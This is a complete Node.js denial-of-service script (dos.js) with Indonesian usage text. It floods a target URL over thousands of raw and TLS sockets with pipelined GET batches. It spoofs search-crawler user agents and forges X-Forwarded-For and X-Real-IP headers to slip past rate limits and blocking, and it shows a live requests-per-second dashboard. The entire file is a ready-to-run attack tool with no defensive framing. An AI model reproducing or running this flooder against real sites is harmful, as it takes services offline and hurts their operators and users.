#!/usr/bin/env node 

const net = require('net');
const http = require('http');
const https = require('https');
const tls = require('tls'); 

class HTTP1Extreme {
    constructor(targetUrl, connections = 5000, batchSize = 200) {
        this.targetUrl = targetUrl;
        this.connections = connections;
        this.batchSize = batchSize;
        this.parsedUrl = new URL(targetUrl);
        this.sockets = [];
        this.running = true;
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)',
            'Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.52',
            'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.9.168 Version/11.52',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:8.0) Gecko/20100101 Firefox/8.0',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:8.0) Gecko/20100101 Firefox/8.0',
            'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0',
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-US) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.8; en-US; rv:8.0) Gecko/20100101 Firefox/8.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            "Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Mac_68K)",
            "Mozilla/5.0 (X11; U; UNICOS lcLinux; en-US) Gecko/20140730 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
            "Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
            "Mozilla/5.0 (Windows; U; ; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
            "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
            "Mozilla/5.0 (Windows; U; ; en-EN) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
            "Mozilla/5.0 (X11; U; Linux; ru-RU) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: 802 025a17d)",
            "Mozilla/5.0 (X11; U; Linux; fi-FI) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: 754 46b659a)",
            "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"
        ];
        this.stats = {
            sent: 0,
            failed: 0,
            responses: 0,
            connected: 0
        };
        
        process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
        this.requestTemplate = this.createRequestTemplate();
        this.httpAgent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 100,
            maxSockets: Infinity,
            maxFreeSockets: Infinity,
            scheduling: 'fifo'
        });
        
        this.httpsAgent = new https.Agent({
            keepAlive: true,
            keepAliveMsecs: 100,
            maxSockets: Infinity,
            maxFreeSockets: Infinity,
            scheduling: 'fifo',
            rejectUnauthorized: false
        });
    }
         
    createRequestTemplate() {
        const path = this.parsedUrl.pathname + this.parsedUrl.search || '/';
        const host = this.parsedUrl.hostname;
        
        return `GET ${path} HTTP/1.1\r\n` +
               `Host: ${host}\r\n` +
               `User-Agent: ${this.userAgents[Math.floor(Math.random() * this.userAgents.length)]}\r\n` +
               `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
               `Accept-Language: en-US,en;q=0.5\r\n` +
               `Accept-Encoding: gzip, deflate\r\n` +
               `Connection: keep-alive\r\n` +
               `Upgrade-Insecure-Requests: 1\r\n` +
               `X-Forwarded-For: {ip}\r\n` +
               `X-Real-IP: {ip}\r\n` +
               `Cache-Control: no-cache\r\n` +
               `Pragma: no-cache\r\n` +
               `\r\n`;
    }

    generateIP() {
        return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
    }

    createRawSocket() {
        const port = this.parsedUrl.port || (this.parsedUrl.protocol === 'https:' ? 443 : 80);
        const useTLS = this.parsedUrl.protocol === 'https:';
        
        let socket;
        if (useTLS) {
            socket = tls.connect({
                host: this.parsedUrl.hostname,
                port: port,
                servername: this.parsedUrl.hostname,
                rejectUnauthorized: false,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3'
            });
        } else {
            socket = new net.Socket();
        }

        const connectHandler = () => {
            this.stats.connected++;
            
            const sendBatch = () => {
                if (!this.running || socket.destroyed) return;
                let batch = '';
                const ip = this.generateIP();
                for (let i = 0; i < this.batchSize; i++) {
                    batch += this.requestTemplate.replace('{ip}', ip);
                }
                
                socket.write(batch, (err) => {
                    if (!err) {
                        this.stats.sent += this.batchSize;
                        setImmediate(sendBatch);
                    } else {
                        this.stats.failed += this.batchSize;
                        socket.destroy();
                    }
                });
            };
            
            sendBatch();
        };

        if (useTLS) {
            socket.on('secureConnect', connectHandler);
        } else {
            socket.connect(port, this.parsedUrl.hostname, connectHandler);
        }

        socket.on('data', (data) => {
            const responseStr = data.toString();
            const responses = (responseStr.match(/HTTP\/1\.[01] \d{3}/g) || []).length;
            this.stats.responses += responses || 1;
            if (responseStr.includes('503') || responseStr.includes('504')) {
            }
        });

        socket.on('error', (err) => {
            this.stats.failed += this.batchSize;
            socket.destroy();
        });

        socket.on('close', () => {
            if (this.running) {
                setImmediate(() => this.createRawSocket());
            }
        });

        socket.setKeepAlive(true, 1000);
        socket.setNoDelay(true);
        socket.setTimeout(0);
        
        this.sockets.push(socket);
        return socket;
    }

    createHTTPRequest() {
        const options = {
            hostname: this.parsedUrl.hostname,
            port: this.parsedUrl.port || (this.parsedUrl.protocol === 'https:' ? 443 : 80),
            path: this.parsedUrl.pathname + this.parsedUrl.search || '/',
            method: 'GET',
            headers: {
                'Host': this.parsedUrl.hostname,
                'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'X-Forwarded-For': this.generateIP()
            },
            agent: this.parsedUrl.protocol === 'https:' ? this.httpsAgent : this.httpAgent
        };

        const protocol = this.parsedUrl.protocol === 'https:' ? https : http;
        
        const loopReq = () => {
            if (!this.running) return;
            
            const req = protocol.request(options, (res) => {
                this.stats.responses++;
                res.on('data', () => {});
                res.on('end', () => {
                    setImmediate(loopReq);
                });
            });
            
            req.on('error', () => {
                this.stats.failed++;
                setTimeout(loopReq, 1);
            });
            
            req.end();
            this.stats.sent++;
        };
        
        return loopReq;
    }

    async start() {
        console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⣾⣿⣿⣶⣦⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉
⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⢉⣉⣉⣉⣉⣉⡉⠙⠛⠻⠿⣿⠟⠋⠀⠀⠀⠀
⠀⠀⢀⣤⣌⣻⣿⣿⣿⣿⣿⣿⠟⢉⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⠿⠛⠋⣉⣁⣀⣀⣀⣉⡉⠛⠻⢿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣿⠃⡴⠋⣁⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⠃⠜⢠⣾⣿⣿⣿⣿⣿⣿⡿⠿⠿⠛⠛⠛⠿⠿⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⡟⠀⢰⣿⣿⣿⡿⠛⢋⣁⣤⣤⣴⣶⣶⣶⣶⣶⣤⣤⣀⣴⣾⠀⠀⠀⠀⠀⠀
⠀⢿⣿⣿⣿⣿⣿⠇⠀⣿⣿⣿⣿⠃⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⣶⣿⣿⣿⣿⣿⠀⢰⣿⣿⣿⡏⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⠇⠀⢸⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠉⠉⠛⢿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⠏⠀⠀⢸⣿⣿⣷⣄⡙⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠈⢿⣿⣿⠀⠀⠀⠀⠀⠀
⣸⣿⡿⠟⠁⠀⠀⠀⢸⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣷⣶⣤⡄⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀
⠉⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⢿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠙⠿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢸⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⡿⠿⠛⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀ 
        `);

        console.log(`Target: ${this.targetUrl}`);
        console.log(`Connections: ${this.connections}`);
        console.log(`Batch Size: ${this.batchSize} req/batch`);
        console.log(`Target RPS: ${this.connections * this.batchSize * 30}\n`);

        console.log('Creating raw socket connections...');
        const rawConnections = Math.floor(this.connections * 0.4);
        for (let i = 0; i < rawConnections; i++) {
            this.createRawSocket();
            if (i % 100 === 0) {
                process.stdout.write(`\r  Progress: ${i}/${rawConnections}`);
                await new Promise(r => setTimeout(r, 1));
            }
        }

        console.log('\nCreating HTTP agent connections...');
        const httpConnections = this.connections - rawConnections;
        for (let i = 0; i < httpConnections; i++) {
            const reqLoop = this.createHTTPRequest();
            reqLoop();
            if (i % 100 === 0) {
                process.stdout.write(`\r  Progress: ${i}/${httpConnections}`);
                await new Promise(r => setTimeout(r, 1));
            }
        }

        console.log('\n\nALL CONNECTIONS ESTABLISHED!\n');

        let lastSent = 0;
        let lastTime = Date.now();
        let rpsHistory = [];

        setInterval(() => {
            const now = Date.now();
            const elapsed = (now - lastTime) / 1000;
            const currentRPS = ((this.stats.sent - lastSent) / elapsed);
            
            rpsHistory.push(currentRPS);
            if (rpsHistory.length > 10) rpsHistory.shift();
            
            const avgRPS = rpsHistory.reduce((a, b) => a + b, 0) / rpsHistory.length;
            const maxRPS = Math.max(...rpsHistory);
            
            lastSent = this.stats.sent;
            lastTime = now;

            const activeSockets = this.sockets.filter(s => !s.destroyed).length;
            const successRate = this.stats.sent > 0 ? 
                ((this.stats.responses / this.stats.sent) * 100).toFixed(2) : '0.00';

            console.clear();
            console.log(`
║  Target      : ${this.targetUrl.substring(0, 35)}
║  ───────────────────────────────────────────────────────
║  CURRENT RPS : ${currentRPS.toFixed(0).padStart(10)} req/sec
║  AVG RPS     : ${avgRPS.toFixed(0).padStart(10)} req/sec
║  MAX RPS     : ${maxRPS.toFixed(0).padStart(10)} req/sec
║  ───────────────────────────────────────────────────────
║  TOTAL SENT  : ${this.stats.sent.toLocaleString().padStart(12)}
║  RESPONSES   : ${this.stats.responses.toLocaleString().padStart(12)}
║  SUCCESS RATE: ${successRate.padStart(11)}%
║  FAILED      : ${this.stats.failed.toLocaleString().padStart(12)}
║  ───────────────────────────────────────────────────────
║  ACTIVE SOCK : ${activeSockets.toLocaleString().padStart(12)}
║  BATCH SIZE  : ${this.batchSize.toLocaleString().padStart(12)}
║  ───────────────────────────────────────────────────────
║  STATUS      : ${currentRPS > 100000 ? 'EXTREME' : 
                   currentRPS > 50000 ? 'VERY HIGH' : 
                   currentRPS > 10000 ? 'HIGH' : 
                   currentRPS > 5000 ? 'MEDIUM' : 
                   currentRPS > 1000 ? 'LOW' : 'SLOW'}
            `);
        }, 200);

        // Handle keyboard
        process.stdin.setRawMode(true);
        process.stdin.resume();
        process.stdin.on('data', (key) => {
            const keyStr = key.toString();
            if (keyStr === 'b' || keyStr === 'B') {
                this.batchSize += 50;
                console.log(`\n Batch size increased to ${this.batchSize}`);
            } else if (keyStr === 'c' || keyStr === 'C') {
                for (let i = 0; i < 100; i++) {
                    this.createRawSocket();
                }
                console.log('\nAdded 100 connections');
            } else if (keyStr === 'r' || keyStr === 'R') {
                console.log('\nIP rotation active');
            } else if (keyStr === 'x' || keyStr === 'X') {
                this.stop();
            } else if (keyStr === '\u0003') {
                this.stop();
            }
        });
    }

    stop() {
        this.running = false;
        console.log('\n\n[🛑] Stopping...');
        this.sockets.forEach(s => {
            try { s.destroy(); } catch (e) {}
        });
        this.httpAgent.destroy();
        this.httpsAgent.destroy();
        process.exit();
    }
}

const args = process.argv.slice(2);

if (args.length < 1) {
    console.log(`
 CARA PAKE:                             
 node dos.js <url> [connections] [batch]       
                                                          
 CONTOH:                                                  
 node dos.js http://target.com 2000 200        
 node dos.js https://target.com 5000 500       
 node dos.js http://localhost:8080 1000 1000   

 PARAMETER:                                               
 connections = jumlah socket (default: 5000)             
 batch       = request per batch (default: 200)          
    `);
    process.exit(1);
}

const target = args[0];
const connections = parseInt(args[1]) || 5000;
const batch = parseInt(args[2]) || 200;

try {
    new URL(target);
} catch (err) {
    console.log('[❌] URL GAK VALID!');
    process.exit(1);
}

const dos = new HTTP1Extreme(target, connections, batch);
dos.start().catch(console.error);